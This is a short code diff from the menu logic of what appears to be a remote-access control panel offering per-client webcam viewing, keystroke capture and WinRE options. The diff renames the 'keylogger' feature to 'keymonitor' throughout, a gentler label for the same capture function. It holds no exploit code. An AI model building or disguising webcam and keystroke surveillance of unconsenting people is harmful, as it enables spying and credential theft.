@@ -190,11 +190,11 @@ function applyMenuSupportRules(clientId) {
   const webcamBtn = menu.querySelector('[data-open="webcam"]');
   setAvailability(webcamBtn, isWindows, "Webcam viewer is only supported on Windows clients.");
 
-  const keyloggerBtn = menu.querySelector('[data-open="keylogger"]');
+  const keymonitorBtn = menu.querySelector('[data-open="keymonitor"]');
   setAvailability(
-    keyloggerBtn,
+    keymonitorBtn,
     isWindows,
-    "Keylogger capture is only fully supported on Windows clients.",
+    "Keymonitor capture is only fully supported on Windows clients.",
   );
 
   const winreBtn = menu.querySelector('[data-open="winre"]');
@@ -843,8 +843,8 @@ menu.addEventListener("click", async (e) => {
     closeMenu(clearContext);
     return;
   }
-  if (open === "keylogger") {
-    window.open(`/${contextCard}/keylogger`, "_blank", "noopener");
+  if (open === "keymonitor") {
+    window.open(`/${contextCard}/keymonitor`, "_blank", "noopener");
     closeMenu(clearContext);
     return;
   }
